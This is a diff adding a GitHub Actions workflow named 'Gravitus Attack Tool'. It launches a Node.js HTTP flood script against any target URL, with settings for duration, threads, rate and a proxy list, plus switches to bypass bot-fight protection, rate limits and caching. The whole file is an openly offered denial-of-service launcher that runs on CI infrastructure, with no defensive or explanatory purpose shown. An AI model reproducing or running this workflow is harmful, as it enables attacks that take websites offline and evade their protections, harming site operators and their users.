@@ -1,0 +1,85 @@
+name: Gravitus Attack Tool
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        default: 'https://example.com'
+      duration:
+        description: 'Duration in seconds'
+        required: true
+        default: '120'
+      threads:
+        description: 'Number of threads'
+        required: true
+        default: '30'
+      rate:
+        description: 'Rate limit'
+        required: true
+        default: '10'
+      proxy_file:
+        description: 'Proxy file name'
+        required: true
+        default: 'proxy.txt'
+      bot_fight:
+        description: 'Enable Bot Fight Mode'
+        type: boolean
+        default: true
+      rate_bypass:
+        description: 'Enable Rate Limit Bypass'
+        type: boolean
+        default: true
+      origin_control:
+        description: 'Enable Origin Header Control'
+        type: boolean
+        default: true
+      cache_bypass:
+        description: 'Enable Cache Bypass'
+        type: boolean
+        default: true
+
+jobs:
+  run-gravitus:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
+      run: |
+        npm install puppeteer-real-browser
+        npm install hpack
+        npm install colors
+        npx @puppeteer/browsers install chrome@stable
+
+    - name: Run Gravitus Attack
+      run: |
+        # Build command arguments
+        ARGS="${{ inputs.target }} ${{ inputs.duration }} ${{ inputs.threads }} ${{ inputs.rate }} ${{ inputs.proxy_file }}"
+        
+        # Add optional flags
+        if [ "${{ inputs.bot_fight }}" = "true" ]; then
+          ARGS="$ARGS --bot-fight"
+        fi
+        
+        if [ "${{ inputs.rate_bypass }}" = "true" ]; then
+          ARGS="$ARGS --rate-bypass"
+        fi
+        
+        if [ "${{ inputs.origin_control }}" = "true" ]; then
+          ARGS="$ARGS --origin-control"
+        fi
+        
+        if [ "${{ inputs.cache_bypass }}" = "true" ]; then
+          ARGS="$ARGS --cache-bypass"
+        fi
+        
+        # Run the attack
+        node gravitus.js $ARGS
